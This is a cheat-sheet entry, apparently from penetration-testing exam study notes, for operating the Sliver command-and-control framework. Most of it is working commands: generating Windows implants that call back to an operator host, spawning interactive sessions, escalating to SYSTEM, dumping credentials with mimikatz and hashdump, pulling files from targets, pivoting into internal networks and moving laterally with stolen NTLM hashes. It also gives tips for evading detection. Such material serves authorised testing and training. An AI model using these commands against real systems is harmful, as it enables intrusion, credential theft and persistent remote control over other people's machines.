title: Sliver C2 — Modern Post-Exploitation Framework
body: Sliver is a modern open-source C2 framework (BishopFox) — Go-based, supports multiple listeners (HTTP, DNS, mTLS, WireGuard), beacon/session modes, execute-assembly for in-memory .NET, and built-in armory of post-ex tools. Better than MSF for long-term access: less signatured, better pivoting, multiplayer ops. OffSec PEN-200 teaches this as Module 21 alternative. Pairs well with Ligolo-NG for pivoting.
cmd:
# ══════════════════════════════════════════════════
# SETUP — Server + Client + Operator
# ══════════════════════════════════════════════════
# Download: https://github.com/BishopFox/sliver/releases
# Run server (central hub):
./sliver-server_linux

# Inside sliver-server — create operator config and enable multiplayer:
new-operator --lhost 192.168.X.X --name ph03n1x
multiplayer

# Connect client (separate terminal):
./sliver-client_linux import ph03n1x_192.168.X.X.cfg
./sliver-client_linux

# ══════════════════════════════════════════════════
# ARMORY — Built-in .NET post-ex toolkit
# ══════════════════════════════════════════════════
# In-memory execution, no disk artifacts
# Install on SERVER (shared across operators, no client deps):
armory install Seatbelt       # single tool
armory install all            # full toolkit

# If install fails — fix DNS first:
cat /etc/resolv.conf    # should have nameserver 8.8.8.8

# Available tools include: Seatbelt, SharpUp, Rubeus,
# SharpHound, SharpEfsPotato, Certify, Mimikatz, SafetyKatz

# ══════════════════════════════════════════════════
# LISTENERS — pick based on OPSEC needs
# ══════════════════════════════════════════════════
# Run from INSIDE sliver-client (not shell)

http                          # port 80   — fast, flexible, easy to detect
https                         # port 443  — TLS-wrapped HTTP
dns                           # port 53   — covert, slow (conflicts w/ WireGuard)
mtls                          # port 8888 — cert-auth, anti-MITM
wg                            # port 53   — WireGuard VPN tunnel

# Custom ports (always change in real ops):
http --lport 8080
mtls --lport 4443

# List active listeners:
jobs

# ══════════════════════════════════════════════════
# IMPLANTS — Beacon vs Session
# ══════════════════════════════════════════════════
# BEACON = periodic callback (stealthy, async)
# SESSION = persistent TCP connection (interactive, like meterpreter)

# Generate HTTP beacon (Windows):
# ⚠ PORT IS BAKED IN AT GENERATE TIME. host:port here MUST match your listener.
# --http 192.168.X.X  (no port) bakes in the DEFAULT (:80). If your listener is
# on 8080, this beacon calls :80 and connects to nothing. Pin the port explicitly:
generate beacon --http 192.168.X.X:8080 --jitter 4 --seconds 5 \
  --skip-symbols -N http_beacon --os windows
# --jitter 4      = ±4% callback timing variance
# --seconds 5     = base callback interval
# --skip-symbols  = skip symbol obfuscation (FASTER build, LESS stealthy)
# -N              = implant name

# Stageless (all-in-one, larger, more reliable):
generate --http 192.168.X.X:8080 --os windows -N full_session

# mTLS session (best for interactive work):
generate --mtls 192.168.X.X:4443 --os windows -N mtls_session

# List generated implants:
implants

# ════════════════════════════════════════════════════════════
# TROUBLESHOOTING — implant connects to nothing (dead callback)
# ════════════════════════════════════════════════════════════
# #1 cause: PORT MISMATCH between the implant and the listener.
# The host:port is FROZEN into the implant when you run `generate`.
# Defaults baked in when you omit the port:
#   http=80   https=443   mtls=8888   dns=53   wg=53
# So `generate --http 1.2.3.4` + `http --lport 8080` = beacon hits :80,
# listener sits on :8080 = silence. Symptom looks identical to a dead listener.
#
# Diagnose — compare the two sides:
implants                      # what host:port was the implant BUILT with?
jobs                          # what port is the listener ACTUALLY on?
# They must match. Then fix ONE side:
#   (a) regenerate the implant to match the live listener:
generate beacon --http 192.168.X.X:8080 -N http_beacon --os windows
#   (b) OR move the listener to the implant's baked-in port:
jobs -k <id>                  # kill the wrong-port listener
http --lport 80               # restart where the implant expects to call
#
# Once ports match and it's still dead, check (in order):
#   - listener not actually running    → jobs (empty? start it)
#   - target host firewall blocks egress on that port
#   - redirector / Ligolo forward port not lined up end-to-end
#   - stale job from a prior run bound to the port → jobs -k <id>, restart

# ══════════════════════════════════════════════════
# INTERACT — Beacon → Session (upgrade to interactive)
# ══════════════════════════════════════════════════
# A beacon is ASYNC: tasks queue and run on the next check-in. To get
# real-time control (live shell, socks5, port-fwd) you UPGRADE it to a
# session. This does NOT kill the beacon — they coexist.

beacons                       # list active beacons, grab ID/name
use <beacon-id>               # select it — prompt: sliver (NAME) >
interactive                   # TASK the beacon to spawn a session

# ⚠ The session does NOT appear instantly. `interactive` only QUEUES
# the task; the session opens on the beacon's NEXT check-in. With
# --seconds 5 --jitter 4 that's a few seconds — a long interval means a
# long wait. On success you'll see:
#   [*] Session <id> NAME - host (user) - windows/amd64 - https

sessions                      # confirm the new session is listed
use <session-id>              # ENTER it (or: sessions -i <session-id>)
# prompt flips to session context — shell / execute-assembly / socks5
# now run LIVE instead of queuing async

background                    # deselect, return to top-level

# Beacon + session COEXIST. Keep the beacon as a resilient fallback:
# if the session dies (reboot, network blip), just `use <beacon-id>`
# and `interactive` again to respawn.

# ── Tasked "interactive" but NO session ever appeared? ──
# The session dials the SAME baked-in host:port as the beacon, so this
# is the port-mismatch / dead-listener problem above — not interactive:
jobs                          # is the listener still up on the right port?
beacons                       # is the beacon even still checking in?
# Fix the listener/port, wait one check-in, retry interactive.

# Detect Sliver in its own output (check your beacon isn't noisy):
strings http_beacon.exe | grep -i sliver | tail -10
# If lots of 'bishopfox/sliver/...' strings appear, rebuild without --skip-symbols

# ══════════════════════════════════════════════════
# EXECUTE-ASSEMBLY — run .NET tools in-memory
# ══════════════════════════════════════════════════
# This is the killer feature — no file touches disk

# Prep: get SharpCollection or precompiled-binaries on Kali
git clone https://github.com/Flangvik/SharpCollection.git
git clone https://github.com/jakobfriedl/precompiled-binaries

# Enumerate (Seatbelt via armory):
sharpup audit
seatbelt -group=all

# Privesc (SharpEfsPotato — SeImpersonate → SYSTEM):
execute-assembly /home/kali/precompiled-binaries/PrivilegeEscalation/Token/SharpEfsPotato.exe \
  --arguments "-p C:\\Users\\user\\http_beacon.exe"

# Credential dumping (armory aliases):
hashdump                      # SAM hashes (needs SYSTEM)
mimikatz "privilege::debug sekurlsa::logonpasswords exit"

# SharpHound for BloodHound:
execute-assembly SharpHound.exe --arguments "--CollectionMethod All"

# ══════════════════════════════════════════════════
# PIVOTING — socks5 (session only, NOT beacon)
# ══════════════════════════════════════════════════
interactive                   # upgrade beacon to session FIRST
sa-ipconfig                   # check target's network interfaces
socks5 start --port 1080      # start socks5 on Sliver server

# On Kali, add to /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# Then use proxychains:
proxychains nmap -sT -Pn 172.16.X.0/24

# NOTE: Sliver's proxychains integration is buggy in some versions
# Use Ligolo-NG instead for reliable pivoting (see ligolo node)

# ══════════════════════════════════════════════════
# PIVOTING — Ligolo-NG integration (RECOMMENDED)
# ══════════════════════════════════════════════════
# Custom Sliver alias for Ligolo — no more proxychains
git clone https://github.com/KriyosArcane/sliver-ligolo-ng.git
cd sliver-ligolo-ng && sudo apt install golang && make

# In sliver-client — load the alias:
aliases load /home/kali/sliver-ligolo-ng/alias.json

# Start Ligolo proxy:
cd ~/.sliver-client/aliases/ligolo-ng
sudo ./ligolo-ng-proxy-linux-amd64 --selfcert

# Create tunnel interface (separate terminal):
sudo ip tuntap add user root mode tun tunnel1
sudo ip link set tunnel1 up

# In sliver-client — connect implant to Ligolo:
ligolo-ng -- -connect 192.168.X.X:11601 -ignore-cert

# In Ligolo proxy — bind session to tunnel:
start --tun tunnel1

# Route internal network through tunnel:
sudo ip route add 172.16.X.0/24 dev tunnel1

# Verify — hit internal hosts directly from Kali:
nxc smb 172.16.X.0/24 -u user -H HASH --continue-on-success

# See ligolo node for full double-pivot + port forward workflows

# ══════════════════════════════════════════════════
# FILE OPERATIONS
# ══════════════════════════════════════════════════
ls                            # list target files
download C:\\path\\file       # pull file from target
upload /home/kali/tool.exe    # push file to target
cd C:\\Users\\user\\Desktop   # change dir
pwd                           # current dir
cat file.txt                  # read file

# Cross-host file ops via SMB share (after pivot):
ls //172.16.X.200/c$/Users/user/Desktop
cd //172.16.X.200/c$/Users/user/Desktop
upload /home/kali/pivot_beacon.exe

# ══════════════════════════════════════════════════
# LATERAL MOVEMENT — with creds/hashes
# ══════════════════════════════════════════════════
# Upload + execute via NXC (from Kali, through Ligolo tunnel):
nxc smb 172.16.X.200 -u user -H NTHASH -d DOMAIN \
  --put /home/kali/beacon.exe Users/user/Desktop/beacon.exe
nxc smb 172.16.X.200 -u user -H NTHASH -d DOMAIN \
  -x "C:\\Users\\user\\Desktop\\beacon.exe"

# Or SharpNoPSExec via execute-assembly:
execute-assembly --in-process \
  SharpCollection/NetFramework_4.7_x64/SharpNoPSExec.exe \
  --target=172.16.X.200 --username=user --password="Pass" \
  --domain=DOMAIN --payload="C:\\path\\beacon.exe"

# ══════════════════════════════════════════════════
# CLEANUP — DO NOT SKIP THIS
# ══════════════════════════════════════════════════
# List all beacons/sessions:
beacons
sessions

# Kill individual:
beacons -K <id>
sessions -K <id>

# Kill ALL implants:
beacons -K all
sessions -K all

# Remove listeners:
jobs -k <id>

# Pivot teardown — Ligolo tun interfaces (full steps in the ligolo node):
# remove the route FIRST, then the interface. NOT tun0 — that's your VPN.
sudo ip route del 172.16.X.0/24 dev tunnel1
sudo ip link del tunnel1
ip -o link show type tun       # verify no orphaned tunnelN/ligolo remain

# Exit client:
exit
warn: PORT MISMATCH is the #1 dead-callback cause: the host:port is baked into the implant at generate time, so `generate --http HOST` (defaults to :80) paired with a listener on a custom port (e.g. http --lport 8080) silently fails — always pin the port on generate to match the listener. Sliver implants with --skip-symbols leak 'bishopfox/sliver' strings — verify with 'strings beacon.exe | grep sliver' and rebuild without flag if engagement is OPSEC-sensitive. socks5 pivoting only works in SESSION mode, not beacon — run 'interactive' first. DNS and WireGuard listeners both default to port 53 and conflict if run together. Armory install fails silently on bad DNS — set 8.8.8.8 in /etc/resolv.conf. Proxychains integration is flaky in v1.5.x — use Ligolo-NG alias instead. Always kill beacons/sessions before ending engagement or you leave persistent callbacks in the environment.

choices.label: Need to pivot into internal network
Got SYSTEM — enumerate for more creds
